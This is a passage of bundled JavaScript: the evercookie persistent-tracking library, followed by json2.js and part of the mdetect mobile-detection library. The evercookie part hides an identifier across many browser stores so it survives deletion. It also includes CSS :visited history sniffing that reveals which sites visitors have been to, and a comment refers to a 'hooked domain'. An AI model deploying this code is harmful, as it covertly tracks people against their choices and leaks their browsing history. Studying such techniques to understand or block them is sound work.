                (typeof _global_isolated == 'undefined')
			)
			&&
			i++ < _ec_tests
		)
		{
			setTimeout(function() { self._evercookie(name, cb, value, i, dont_reset) }, 300);
		}

		// we hit our max wait time or got all our data
		else
		{
			// get just the piece of data we need from swf
			self._ec.lsoData = self.getFromStr(name, _global_lso);
			_global_lso = undefined;
            
			// get just the piece of data we need from silverlight
			self._ec.slData = self.getFromStr(name, _global_isolated);
			_global_isolated = undefined;

			var tmpec = self._ec;
			self._ec = {};
			
			// figure out which is the best candidate
			var candidates = new Array();
			var bestnum = 0;
			var candidate;
			for (var item in tmpec)
			{
				if (typeof tmpec[item] != 'undefined' && typeof tmpec[item] != 'null' && tmpec[item] != '' &&
				  tmpec[item] != 'null' && tmpec[item] != 'undefined' && tmpec[item] != null)
				{
						candidates[tmpec[item]] = typeof candidates[tmpec[item]] == 'undefined' ? 1 : candidates[tmpec[item]] + 1;
				}
			}
			
			for (var item in candidates)
			{
				if (candidates[item] > bestnum)
				{
					bestnum = candidates[item];
					candidate = item;
				}
			}
			
			// reset cookie everywhere
			if (typeof dont_reset == "undefined" || dont_reset != 1)
				self.set(name, candidate);

			if (typeof cb == 'function')
				cb(candidate, tmpec);
		}
	}
};

this.evercookie_window = function(name, value)
{
	try {
		if (typeof(value) != "undefined")
			window.name = _ec_replace(window.name, name, value);
		else
			return this.getFromStr(name, window.name);
	} catch(e) { }
};

this.evercookie_userdata = function(name, value)
{
	try {
		var elm = this.createElem('div', 'userdata_el', 1);
		elm.style.behavior = "url(#default#userData)";

		if (typeof(value) != "undefined")
		{
			elm.setAttribute(name, value);
			elm.save(name);
		}
		else
		{
			elm.load(name);
			return elm.getAttribute(name);
		}
	} catch(e) { }
};

this.evercookie_cache = function(name, value)
{
	if (typeof(value) != "undefined")
	{
		// make sure we have evercookie session defined first
		document.cookie = 'evercookie_cache=' + value;
		
		// evercookie_cache.php handles caching
		var img = new Image();
		img.style.visibility = 'hidden';
		img.style.position = 'absolute';
		img.src = 'evercookie_cache.php?name=' + name;
	}
	else
	{
		// interestingly enough, we want to erase our evercookie
		// http cookie so the php will force a cached response
		var origvalue = this.getFromStr('evercookie_cache', document.cookie);
		self._ec.cacheData = undefined;
		document.cookie = 'evercookie_cache=; expires=Mon, 20 Sep 2010 00:00:00 UTC; path=/';

		$.ajax({
			url: 'evercookie_cache.php?name=' + name,
			success: function(data) {
				// put our cookie back
				document.cookie = 'evercookie_cache=' + origvalue + '; expires=Tue, 31 Dec 2030 00:00:00 UTC; path=/';

				self._ec.cacheData = data;
			}
		});
	}
};

this.evercookie_etag = function(name, value)
{
	if (typeof(value) != "undefined")
	{
		// make sure we have evercookie session defined first
		document.cookie = 'evercookie_etag=' + value;
		
		// evercookie_etag.php handles etagging
		var img = new Image();
		img.style.visibility = 'hidden';
		img.style.position = 'absolute';
		img.src = 'evercookie_etag.php?name=' + name;
	}
	else
	{
		// interestingly enough, we want to erase our evercookie
		// http cookie so the php will force a cached response
		var origvalue = this.getFromStr('evercookie_etag', document.cookie);
		self._ec.etagData = undefined;
		document.cookie = 'evercookie_etag=; expires=Mon, 20 Sep 2010 00:00:00 UTC; path=/';

		$.ajax({
			url: 'evercookie_etag.php?name=' + name,
			success: function(data) {
				// put our cookie back
				document.cookie = 'evercookie_etag=' + origvalue + '; expires=Tue, 31 Dec 2030 00:00:00 UTC; path=/';

				self._ec.etagData = data;
			}
		});
	}
};

this.evercookie_lso = function(name, value)
{
    var div = document.getElementById('swfcontainer');
	if (!div)
	{
		div = document.createElement("div");
		div.setAttribute('id', 'swfcontainer');
		document.body.appendChild(div);
	}

	var flashvars = {};
	if (typeof value != 'undefined')
		flashvars.everdata = name + '=' + value;

	var params           = {};
	params.swliveconnect = "true";
	var attributes       = {};
	attributes.id        = "myswf";
	attributes.name      = "myswf";
	swfobject.embedSWF("evercookie.swf", "swfcontainer", "1", "1", "9.0.0", false, flashvars, params, attributes);
};

this.evercookie_png = function(name, value)
{
	if (document.createElement('canvas').getContext)
	{
		if (typeof(value) != "undefined")
		{
			// make sure we have evercookie session defined first
			document.cookie = 'evercookie_png=' + value;
			
			// evercookie_png.php handles the hard part of generating the image
			// based off of the http cookie and returning it cached
			var img = new Image();
			img.style.visibility = 'hidden';
			img.style.position = 'absolute';
			img.src = 'evercookie_png.php?name=' + name;
		}
		else
		{
			self._ec.pngData = undefined;
			var context = document.createElement('canvas');
			context.style.visibility = 'hidden';
			context.style.position = 'absolute';
			context.width = 200;
			context.height = 1;
			var ctx = context.getContext('2d');
			
			// interestingly enough, we want to erase our evercookie
			// http cookie so the php will force a cached response
			var origvalue = this.getFromStr('evercookie_png', document.cookie);
			document.cookie = 'evercookie_png=; expires=Mon, 20 Sep 2010 00:00:00 UTC; path=/';

			var img = new Image();
			img.style.visibility = 'hidden';
			img.style.position = 'absolute';
			img.src = 'evercookie_png.php?name=' + name;
			
			img.onload = function()
			{
				// put our cookie back
				document.cookie = 'evercookie_png=' + origvalue + '; expires=Tue, 31 Dec 2030 00:00:00 UTC; path=/';

				self._ec.pngData = '';
				ctx.drawImage(img,0,0);

				// get CanvasPixelArray from  given coordinates and dimensions
				var imgd = ctx.getImageData(0, 0, 200, 1);
				var pix = imgd.data;

				// loop over each pixel to get the "RGB" values (ignore alpha)
				for (var i = 0, n = pix.length; i < n; i += 4)
				{
					if (pix[i  ] == 0) break;
					self._ec.pngData += String.fromCharCode(pix[i]);
					if (pix[i+1] == 0) break;
					self._ec.pngData += String.fromCharCode(pix[i+1]);
					if (pix[i+2] == 0) break;
					self._ec.pngData += String.fromCharCode(pix[i+2]);
				}
			}	
		}
	}
};

this.evercookie_local_storage = function(name, value)
{
	try
	{
		if (window.localStorage)
		{
			if (typeof(value) != "undefined")
				localStorage.setItem(name, value);
			else
				return localStorage.getItem(name);
		}
	}
	catch (e) { }
};

this.evercookie_database_storage = function(name, value)
{
	try
	{
		if (window.openDatabase)
		{		
			var database = window.openDatabase("sqlite_evercookie", "", "evercookie", 1024 * 1024);

			if (typeof(value) != "undefined")
				database.transaction(function(tx)
				{
					tx.executeSql("CREATE TABLE IF NOT EXISTS cache(" +
						"id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, " +
						"name TEXT NOT NULL, " +
						"value TEXT NOT NULL, " +
						"UNIQUE (name)" + 
					")", [], function (tx, rs) { }, function (tx, err) { });

					tx.executeSql("INSERT OR REPLACE INTO cache(name, value) VALUES(?, ?)", [name, value],
						function (tx, rs) { }, function (tx, err) { })
				});
			else
			{
				database.transaction(function(tx)
				{
					tx.executeSql("SELECT value FROM cache WHERE name=?", [name],
					function(tx, result1) {
						if (result1.rows.length >= 1)
							self._ec.dbData = result1.rows.item(0)['value'];
						else
							self._ec.dbData = '';
					}, function (tx, err) { })
				});
			}
		}
	} catch(e) { }
};

this.evercookie_session_storage = function(name, value)
{
	try
	{
		if (window.sessionStorage)
		{
			if (typeof(value) != "undefined")
				sessionStorage.setItem(name, value);
			else
				return sessionStorage.getItem(name);
		}
	} catch(e) { }
};

this.evercookie_global_storage = function(name, value)
{
	if (window.globalStorage)
	{
		var host = this.getHost();

		try
		{
			if (typeof(value) != "undefined")
				eval("globalStorage[host]." + name + " = value");
			else
				return eval("globalStorage[host]." + name);
		} catch(e) { }
	}
};
this.evercookie_silverlight = function(name, value) {
    /*
     * Create silverlight embed
     * 
     * Ok. so, I tried doing this the proper dom way, but IE chokes on appending anything in object tags (including params), so this
     * is the best method I found. Someone really needs to find a less hack-ish way. I hate the look of this shit.
    */
        var source = "evercookie.xap";
        var minver = "4.0.50401.0";
        
        var initParam = "";
        if(typeof(value) != "undefined")
            initParam = '<param name="initParams" value="'+name+'='+value+'" />';
        
        var html =
        '<object data="data:application/x-silverlight-2," type="application/x-silverlight-2" id="mysilverlight" width="0" height="0">' +
            initParam +
            '<param name="source" value="'+source+'"/>' +
            '<param name="onLoad" value="onSilverlightLoad"/>' +
            '<param name="onError" value="onSilverlightError"/>' +
            '<param name="background" value="Transparent"/>' +
            '<param name="windowless" value="true"/>' +
            '<param name="minRuntimeVersion" value="'+minver+'"/>' +
            '<param name="autoUpgrade" value="true"/>' +
            '<a href="http://go.microsoft.com/fwlink/?LinkID=149156&v='+minver+'" style="text-decoration:none">' +
              '<img src="http://go.microsoft.com/fwlink/?LinkId=108181" alt="Get Microsoft Silverlight" style="border-style:none"/>' +
            '</a>' +
        '</object>';
        document.body.innerHTML+=html;
};

// public method for encoding
this.encode = function (input) {
	var output = "";
	var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
	var i = 0;

	input = this._utf8_encode(input);

	while (i < input.length) {

		chr1 = input.charCodeAt(i++);
		chr2 = input.charCodeAt(i++);
		chr3 = input.charCodeAt(i++);

		enc1 = chr1 >> 2;
		enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
		enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
		enc4 = chr3 & 63;

		if (isNaN(chr2)) {
			enc3 = enc4 = 64;
		} else if (isNaN(chr3)) {
			enc4 = 64;
		}

		output = output +
		_baseKeyStr.charAt(enc1) + _baseKeyStr.charAt(enc2) +
		_baseKeyStr.charAt(enc3) + _baseKeyStr.charAt(enc4);

	}

	return output;
};

// public method for decoding
this.decode = function (input) {
	var output = "";
	var chr1, chr2, chr3;
	var enc1, enc2, enc3, enc4;
	var i = 0;

	input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

	while (i < input.length) {
		enc1 = _baseKeyStr.indexOf(input.charAt(i++));
		enc2 = _baseKeyStr.indexOf(input.charAt(i++));
		enc3 = _baseKeyStr.indexOf(input.charAt(i++));
		enc4 = _baseKeyStr.indexOf(input.charAt(i++));

		chr1 = (enc1 << 2) | (enc2 >> 4);
		chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
		chr3 = ((enc3 & 3) << 6) | enc4;

		output = output + String.fromCharCode(chr1);

		if (enc3 != 64) {
			output = output + String.fromCharCode(chr2);
		}
		if (enc4 != 64) {
			output = output + String.fromCharCode(chr3);
		}

	}

	output = this._utf8_decode(output);

	return output;

};

// private method for UTF-8 encoding
this._utf8_encode = function (string) {
	string = string.replace(/\r\n/g,"\n");
	var utftext = "";

	for (var n = 0; n < string.length; n++) {

		var c = string.charCodeAt(n);

		if (c < 128) {
			utftext += String.fromCharCode(c);
		}
		else if((c > 127) && (c < 2048)) {
			utftext += String.fromCharCode((c >> 6) | 192);
			utftext += String.fromCharCode((c & 63) | 128);
		}
		else {
			utftext += String.fromCharCode((c >> 12) | 224);
			utftext += String.fromCharCode(((c >> 6) & 63) | 128);
			utftext += String.fromCharCode((c & 63) | 128);
		}

	}

	return utftext;
};

// private method for UTF-8 decoding
this._utf8_decode = function (utftext) {
	var string = "";
	var i = 0;
	var c = c1 = c2 = 0;

	while ( i < utftext.length ) {

		c = utftext.charCodeAt(i);

		if (c < 128) {
			string += String.fromCharCode(c);
			i++;
		}
		else if((c > 191) && (c < 224)) {
			c2 = utftext.charCodeAt(i+1);
			string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
			i += 2;
		}
		else {
			c2 = utftext.charCodeAt(i+1);
			c3 = utftext.charCodeAt(i+2);
			string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
			i += 3;
		}

	}

	return string;
};

// this is crazy but it's 4am in dublin and i thought this would be hilarious
// blame the guinness
this.evercookie_history = function(name, value)
{
	// - is special
	var baseStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=-";
	var baseElems = baseStr.split("");
	
	// sorry google.
	var url = 'http://www.google.com/evercookie/cache/' + this.getHost() + '/' + name;

	if (typeof(value) != "undefined")
	{
		// don't reset this if we already have it set once
		// too much data and you can't clear previous values
		if (this.hasVisited(url))
			return;

		this.createIframe(url, 'if');
		url = url + '/';

		var base = this.encode(value).split("");
		for (var i = 0; i < base.length; i++)
		{
			url = url + base[i];
			this.createIframe(url, 'if' + i);
		}

		// - signifies the end of our data
		url = url + '-';
		this.createIframe(url, 'if_');
	}
	else
	{
		// omg you got csspwn3d
		if (this.hasVisited(url))
		{
			url = url + '/';

			var letter = "";
			var val = "";
			var found = 1;
			while (letter != '-' && found == 1)
			{
				found = 0;
				for (var i = 0; i < baseElems.length; i++)
				{
					if (this.hasVisited(url + baseElems[i]))
					{
						letter = baseElems[i];
						if (letter != '-')
							val = val + letter;
						url = url + letter;
						found = 1;
						break;
					}
				}
			}
			
			// lolz
			return this.decode(val);
		}
	}
};

this.createElem = function(type, name, append)
{
	var el;
	if (typeof name != 'undefined' && document.getElementById(name))
		el = document.getElementById(name);
	else
		el = document.createElement(type);
	el.style.visibility = 'hidden';
	el.style.position = 'absolute';

	if (name)
		el.setAttribute('id', name);

	if (append)
		document.body.appendChild(el);

	return el;
};

this.createIframe = function(url, name)
{
	var el = this.createElem('iframe', name, 1);
	el.setAttribute('src', url);
	return el;
};

// wait for our swfobject to appear (swfobject.js to load)
this.waitForSwf = function(i)
{
	if (typeof i == 'undefined')
		i = 0;
	else
		i++;

	// wait for ~2 seconds for swfobject to appear
	if (i < _ec_tests && typeof swfobject == 'undefined')
		setTimeout(function() { waitForSwf(i) }, 300);
};

this.evercookie_cookie = function(name, value)
{
    try{
        if (typeof(value) != "undefined")
        {
            // expire the cookie first
            document.cookie = name + '=; expires=Mon, 20 Sep 2010 00:00:00 UTC; path=/';
            document.cookie = name + '=' + value + '; expires=Tue, 31 Dec 2030 00:00:00 UTC; path=/';
        }
        else
            return this.getFromStr(name, document.cookie);
    }catch(e){
        // the hooked domain is using HttpOnly, so we must set the hook ID in a different way.
        // evercookie_userdata and evercookie_window will be used in this case.
    }
};

// get value from param-like string (eg, "x=y&name=VALUE")
this.getFromStr = function(name, text)
{
	if (typeof text != 'string')
		return;
		
	var nameEQ = name + "=";
	var ca = text.split(/[;&]/);
	for (var i = 0; i < ca.length; i++)
	{
		var c = ca[i];
		while (c.charAt(0) == ' ')
			c = c.substring(1, c.length);
		if (c.indexOf(nameEQ) == 0)
			return c.substring(nameEQ.length, c.length);
	}
};

this.getHost = function()
{
	var domain = document.location.host;
	if (domain.indexOf('www.') == 0)
		domain = domain.replace('www.', '');
	return domain;
};

this.toHex = function(str)
{
    var r = "";
    var e = str.length;
    var c = 0;
    var h;
    while (c < e)
    {
        h = str.charCodeAt(c++).toString(16);
        while (h.length < 2)
        	h = "0" + h;
        r += h;
    }
    return r;
};

this.fromHex = function(str)
{
    var r = "";
    var e = str.length;
    var s;
    while (e >= 0)
    {
        s = e - 2;
        r = String.fromCharCode("0x" + str.substring(s, e)) + r;
        e = s;
    }
    return r;
};

/* 
 * css history knocker (determine what sites your visitors have been to)
 *
 * originally by Jeremiah Grossman
 * http://jeremiahgrossman.blogspot.com/2006/08/i-know-where-youve-been.html
 *
 * ported to additional browsers by Samy Kamkar
 *
 * compatible with ie6, ie7, ie8, ff1.5, ff2, ff3, opera, safari, chrome, flock
 *
 * - code@samy.pl
 */


this.hasVisited = function(url)
{
	if (this.no_color == -1)
	{
		var no_style = this._getRGB("http://samy-was-here-this-should-never-be-visited.com", -1);
		if (no_style == -1)
			this.no_color =
				this._getRGB("http://samy-was-here-"+Math.floor(Math.random()*9999999)+"rand.com");
	}
	
	// did we give full url?
	if (url.indexOf('https:') == 0 || url.indexOf('http:') == 0)
		return this._testURL(url, this.no_color);
		
	// if not, just test a few diff types	if (exact)
	return	this._testURL("http://" + url, this.no_color) ||
		this._testURL("https://" + url, this.no_color) ||
		this._testURL("http://www." + url, this.no_color) ||
		this._testURL("https://www." + url, this.no_color);
};

/* create our anchor tag */
var _link = this.createElem('a', '_ec_rgb_link');

/* for monitoring */
var created_style;

/* create a custom style tag for the specific link. Set the CSS visited selector to a known value */
var _cssText = '#_ec_rgb_link:visited{display:none;color:#FF0000}';

/* Methods for IE6, IE7, FF, Opera, and Safari */
try {
	created_style = 1;
	var style = document.createElement('style');
	if (style.styleSheet)
		style.styleSheet.innerHTML = _cssText;
	else if (style.innerHTML)
		style.innerHTML = _cssText;
	else
	{
		var cssT = document.createTextNode(_cssText);
		style.appendChild(cssT);
	}
} catch (e) {
	created_style = 0;
}

/* if test_color, return -1 if we can't set a style */
this._getRGB = function (u, test_color) {
    if (test_color && created_style == 0)
        return -1;

    /* create the new anchor tag with the appropriate URL information */
    _link.href = u;
    _link.innerHTML = u;
    // not sure why, but the next two appendChilds always have to happen vs just once
    document.body.appendChild(style);
    document.body.appendChild(_link);

    /* add the link to the DOM and save the visible computed color */
    var color;
    if (document.defaultView)
        color = document.defaultView.getComputedStyle(_link, null).getPropertyValue('color');
    else
        color = _link.currentStyle['color'];

    return color;
};

this._testURL = function(url, no_color){
	var color = this._getRGB(url);

	/* check to see if the link has been visited if the computed color is red */
	if (color == "rgb(255, 0, 0)" || color == "#ff0000")
		return 1;

	/* if our style trick didn't work, just compare default style colors */
	else if (no_color && color != no_color)
		return 1;

	/* not found */
	return 0;
}

};

return _class;
})();


/*
 * Again, ugly workaround....same problem as flash.
*/
var _global_isolated;
function onSilverlightLoad(sender, args) {
    var control = sender.getHost();
    _global_isolated = control.Content.App.getIsolatedStorage();
}
/*
function onSilverlightError(sender, args) {
    _global_isolated = "";
    
}*/
function onSilverlightError(sender, args) {
    _global_isolated = "";
}


/*
    https://github.com/douglascrockford/JSON-js/blob/master/json2.js
    2011-02-23

// Create a JSON object only if one does not already exist. We create the
// methods in a closure to avoid creating global variables.
*/

var JSON;
if (!JSON) {
    JSON = {};
}

(function () {
    "use strict";

    function f(n) {
        // Format integers to have at least two digits.
        return n < 10 ? '0' + n : n;
    }

    if (typeof Date.prototype.toJSON !== 'function') {

        Date.prototype.toJSON = function (key) {

            return isFinite(this.valueOf()) ?
                this.getUTCFullYear()     + '-' +
                f(this.getUTCMonth() + 1) + '-' +
                f(this.getUTCDate())      + 'T' +
                f(this.getUTCHours())     + ':' +
                f(this.getUTCMinutes())   + ':' +
                f(this.getUTCSeconds())   + 'Z' : null;
        };

        String.prototype.toJSON      =
            Number.prototype.toJSON  =
            Boolean.prototype.toJSON = function (key) {
                return this.valueOf();
            };
    }

    var cx = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
        escapable = /[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
        gap,
        indent,
        meta = {    // table of character substitutions
            '\b': '\\b',
            '\t': '\\t',
            '\n': '\\n',
            '\f': '\\f',
            '\r': '\\r',
            '"' : '\\"',
            '\\': '\\\\'
        },
        rep;


    function quote(string) {

// If the string contains no control characters, no quote characters, and no
// backslash characters, then we can safely slap some quotes around it.
// Otherwise we must also replace the offending characters with safe escape
// sequences.

        escapable.lastIndex = 0;
        return escapable.test(string) ? '"' + string.replace(escapable, function (a) {
            var c = meta[a];
            return typeof c === 'string' ? c :
                '\\u' + ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
        }) + '"' : '"' + string + '"';
    }


    function str(key, holder) {

// Produce a string from holder[key].

        var i,          // The loop counter.
            k,          // The member key.
            v,          // The member value.
            length,
            mind = gap,
            partial,
            value = holder[key];

// If the value has a toJSON method, call it to obtain a replacement value.

        if (value && typeof value === 'object' &&
                typeof value.toJSON === 'function') {
            value = value.toJSON(key);
        }

// If we were called with a replacer function, then call the replacer to
// obtain a replacement value.

        if (typeof rep === 'function') {
            value = rep.call(holder, key, value);
        }

// What happens next depends on the value's type.

        switch (typeof value) {
        case 'string':
            return quote(value);

        case 'number':

// JSON numbers must be finite. Encode non-finite numbers as null.

            return isFinite(value) ? String(value) : 'null';

        case 'boolean':
        case 'null':

// If the value is a boolean or null, convert it to a string. Note:
// typeof null does not produce 'null'. The case is included here in
// the remote chance that this gets fixed someday.

            return String(value);

// If the type is 'object', we might be dealing with an object or an array or
// null.

        case 'object':

// Due to a specification blunder in ECMAScript, typeof null is 'object',
// so watch out for that case.

            if (!value) {
                return 'null';
            }

// Make an array to hold the partial results of stringifying this object value.

            gap += indent;
            partial = [];

// Is the value an array?

            if (Object.prototype.toString.apply(value) === '[object Array]') {

// The value is an array. Stringify every element. Use null as a placeholder
// for non-JSON values.

                length = value.length;
                for (i = 0; i < length; i += 1) {
                    partial[i] = str(i, value) || 'null';
                }

// Join all of the elements together, separated with commas, and wrap them in
// brackets.

                v = partial.length === 0 ? '[]' : gap ?
                    '[\n' + gap + partial.join(',\n' + gap) + '\n' + mind + ']' :
                    '[' + partial.join(',') + ']';
                gap = mind;
                return v;
            }

// If the replacer is an array, use it to select the members to be stringified.

            if (rep && typeof rep === 'object') {
                length = rep.length;
                for (i = 0; i < length; i += 1) {
                    if (typeof rep[i] === 'string') {
                        k = rep[i];
                        v = str(k, value);
                        if (v) {
                            partial.push(quote(k) + (gap ? ': ' : ':') + v);
                        }
                    }
                }
            } else {

// Otherwise, iterate through all of the keys in the object.

                for (k in value) {
                    if (Object.prototype.hasOwnProperty.call(value, k)) {
                        v = str(k, value);
                        if (v) {
                            partial.push(quote(k) + (gap ? ': ' : ':') + v);
                        }
                    }
                }
            }

// Join all of the member texts together, separated with commas,
// and wrap them in braces.

            v = partial.length === 0 ? '{}' : gap ?
                '{\n' + gap + partial.join(',\n' + gap) + '\n' + mind + '}' :
                '{' + partial.join(',') + '}';
            gap = mind;
            return v;
        }
    }

// If the JSON object does not yet have a stringify method, give it one.

    if (typeof JSON.stringify !== 'function') {
        JSON.stringify = function (value, replacer, space) {

// The stringify method takes a value and an optional replacer, and an optional
// space parameter, and returns a JSON text. The replacer can be a function
// that can replace values, or an array of strings that will select the keys.
// A default replacer method can be provided. Use of the space parameter can
// produce text that is more easily readable.

            var i;
            gap = '';
            indent = '';

// If the space parameter is a number, make an indent string containing that
// many spaces.

            if (typeof space === 'number') {
                for (i = 0; i < space; i += 1) {
                    indent += ' ';
                }

// If the space parameter is a string, it will be used as the indent string.

            } else if (typeof space === 'string') {
                indent = space;
            }

// If there is a replacer, it must be a function or an array.
// Otherwise, throw an error.

            rep = replacer;
            if (replacer && typeof replacer !== 'function' &&
                    (typeof replacer !== 'object' ||
                    typeof replacer.length !== 'number')) {
                throw new Error('JSON.stringify');
            }

// Make a fake root object containing our value under the key of ''.
// Return the result of stringifying the value.

            return str('', {'': value});
        };
    }


// If the JSON object does not yet have a parse method, give it one.

    if (typeof JSON.parse !== 'function') {
        JSON.parse = function (text, reviver) {

// The parse method takes a text and an optional reviver function, and returns
// a JavaScript value if the text is a valid JSON text.

            var j;

            function walk(holder, key) {

// The walk method is used to recursively walk the resulting structure so
// that modifications can be made.

                var k, v, value = holder[key];
                if (value && typeof value === 'object') {
                    for (k in value) {
                        if (Object.prototype.hasOwnProperty.call(value, k)) {
                            v = walk(value, k);
                            if (v !== undefined) {
                                value[k] = v;
                            } else {
                                delete value[k];
                            }
                        }
                    }
                }
                return reviver.call(holder, key, value);
            }


// Parsing happens in four stages. In the first stage, we replace certain
// Unicode characters with escape sequences. JavaScript handles many characters
// incorrectly, either silently deleting them, or treating them as line endings.

            text = String(text);
            cx.lastIndex = 0;
            if (cx.test(text)) {
                text = text.replace(cx, function (a) {
                    return '\\u' +
                        ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
                });
            }

// In the second stage, we run the text against regular expressions that look
// for non-JSON patterns. We are especially concerned with '()' and 'new'
// because they can cause invocation, and '=' because it can cause mutation.
// But just to be safe, we want to reject all unexpected forms.

// We split the second stage into 4 regexp operations in order to work around
// crippling inefficiencies in IE's and Safari's regexp engines. First we
// replace the JSON backslash pairs with '@' (a non-JSON character). Second, we
// replace all simple value tokens with ']' characters. Third, we delete all
// open brackets that follow a colon or comma or that begin the text. Finally,
// we look to see that the remaining characters are only whitespace or ']' or
// ',' or ':' or '{' or '}'. If that is so, then the text is safe for eval.

            if (/^[\],:{}\s]*$/
                    .test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, '@')
                        .replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, ']')
                        .replace(/(?:^|:|,)(?:\s*\[)+/g, ''))) {

// In the third stage we use the eval function to compile the text into a
// JavaScript structure. The '{' operator is subject to a syntactic ambiguity
// in JavaScript: it can begin a block or an object literal. We wrap the text
// in parens to eliminate the ambiguity.

                j = eval('(' + text + ')');

// In the optional fourth stage, we recursively walk the new structure, passing
// each name/value pair to a reviver function for possible transformation.

                return typeof reviver === 'function' ?
                    walk({'': j}, '') : j;
            }

// If the text is not JSON parseable, then a SyntaxError is thrown.

            throw new SyntaxError('JSON.parse');
        };
    }
}());



/* *******************************************
// Copyright 2010-2012, Anthony Hand
// mdetect : http://code.google.com/p/mobileesp/source/browse/JavaScript/mdetect.js r215
// LICENSE INFORMATION
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//        http://www.apache.org/licenses/LICENSE-2.0
// Unless required by applicable law or agreed to in writing,
// software distributed under the License is distributed on an
// "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND,
// either express or implied. See the License for the specific
// language governing permissions and limitations under the License.
// *******************************************
*/

var isIphone = false;
var isAndroidPhone = false;
var isTierTablet = false;
var isTierIphone = false;
var isTierRichCss = false;
var isTierGenericMobile = false;

var engineWebKit = "webkit";
var deviceIphone = "iphone";
var deviceIpod = "ipod";
var deviceIpad = "ipad";
var deviceMacPpc = "macintosh"; //Used for disambiguation

var deviceAndroid = "android";
var deviceGoogleTV = "googletv";
var deviceXoom = "xoom"; //Motorola Xoom
var deviceHtcFlyer = "htc_flyer"; //HTC Flyer

var deviceNuvifone = "nuvifone"; //Garmin Nuvifone

var deviceSymbian = "symbian";
var deviceS60 = "series60";
var deviceS70 = "series70";
var deviceS80 = "series80";
var deviceS90 = "series90";

var deviceWinPhone7 = "windows phone os 7";
var deviceWinMob = "windows ce";
var deviceWindows = "windows";
var deviceIeMob = "iemobile";
var devicePpc = "ppc"; //Stands for PocketPC
var enginePie = "wm5 pie";  //An old Windows Mobile

var deviceBB = "blackberry";
var vndRIM = "vnd.rim"; //Detectable when BB devices emulate IE or Firefox
var deviceBBStorm = "blackberry95"; //Storm 1 and 2
var deviceBBBold = "blackberry97"; //Bold 97x0 (non-touch)
var deviceBBBoldTouch = "blackberry 99"; //Bold 99x0 (touchscreen)
var deviceBBTour = "blackberry96"; //Tour
var deviceBBCurve = "blackberry89"; //Curve 2
var deviceBBCurveTouch = "blackberry 938"; //Curve Touch 9380
var deviceBBTorch = "blackberry 98"; //Torch
var deviceBBPlaybook = "playbook"; //PlayBook tablet

var devicePalm = "palm";
var deviceWebOS = "webos"; //For Palm's line of WebOS devices
var deviceWebOShp = "hpwos"; //For HP's line of WebOS devices

var engineBlazer = "blazer"; //Old Palm browser
var engineXiino = "xiino";

var deviceKindle = "kindle"; //Amazon Kindle, eInk one
var engineSilk = "silk"; //Amazon's accelerated Silk browser for Kindle Fire

var vndwap = "vnd.wap";
var wml = "wml";

var deviceTablet = "tablet"; //Generic term for slate and tablet devices
var deviceBrew = "brew";
var deviceDanger = "danger";
var deviceHiptop = "hiptop";
var devicePlaystation = "playstation";
var deviceNintendoDs = "nitro";
var deviceNintendo = "nintendo";
var deviceWii = "wii";
var deviceXbox = "xbox";
var deviceArchos = "archos";

var engineOpera = "opera"; //Popular browser
var engineNetfront = "netfront"; //Common embedded OS browser
var engineUpBrowser = "up.browser"; //common on some phones
var engineOpenWeb = "openweb"; //Transcoding by OpenWave server
var deviceMidp = "midp"; //a mobile Java technology
var uplink = "up.link";
var engineTelecaQ = 'teleca q'; //a modern feature phone browser

var devicePda = "pda";
var mini = "mini";  //Some mobile browsers put 'mini' in their names.
var mobile = "mobile"; //Some mobile browsers put 'mobile' in their user agent strings.
var mobi = "mobi"; //Some mobile browsers put 'mobi' in their user agent strings.

var maemo = "maemo";
var linux = "linux";
var qtembedded = "qt embedded"; //for Sony Mylo and others
var mylocom2 = "com2"; //for Sony Mylo also

var manuSonyEricsson = "sonyericsson";
var manuericsson = "ericsson";
var manuSamsung1 = "sec-sgh";
var manuSony = "sony";
var manuHtc = "htc"; //Popular Android and WinMo manufacturer

var svcDocomo = "docomo";
var svcKddi = "kddi";
var svcVodafone = "vodafone";

var disUpdate = "update"; //pda vs. update

var uagent = "";
if (navigator && navigator.userAgent)
    uagent = navigator.userAgent.toLowerCase();

function DetectIphone()
{
   if (uagent.search(deviceIphone) > -1)
   {
      if (DetectIpad() || DetectIpod())
         return false;
      else
         return true;
   }
   else
      return false;
}

function DetectIpod()
{
   if (uagent.search(deviceIpod) > -1)
      return true;
   else
      return false;
}

function DetectIpad()
{
   if (uagent.search(deviceIpad) > -1  && DetectWebkit())
      return true;
   else
      return false;
}

function DetectIphoneOrIpod()
{
   if (uagent.search(deviceIphone) > -1 ||
       uagent.search(deviceIpod) > -1)
       return true;
    else
       return false;
}

function DetectIos()
{
   if (DetectIphoneOrIpod() || DetectIpad())
      return true;
   else
      return false;
}

function DetectAndroid()
{
   if ((uagent.search(deviceAndroid) > -1) || DetectGoogleTV())
      return true;
   if (uagent.search(deviceHtcFlyer) > -1)
      return true;
   else
      return false;
}

function DetectAndroidPhone()
{
   if (DetectAndroid() && (uagent.search(mobile) > -1))
      return true;
   if (DetectOperaAndroidPhone())
      return true;
   if (uagent.search(deviceHtcFlyer) > -1)
      return true;
   else
      return false;
}

function DetectAndroidTablet()
{
   if (!DetectAndroid())
      return false;

   if (DetectOperaMobile())
      return false;
   if (uagent.search(deviceHtcFlyer) > -1)
      return false;

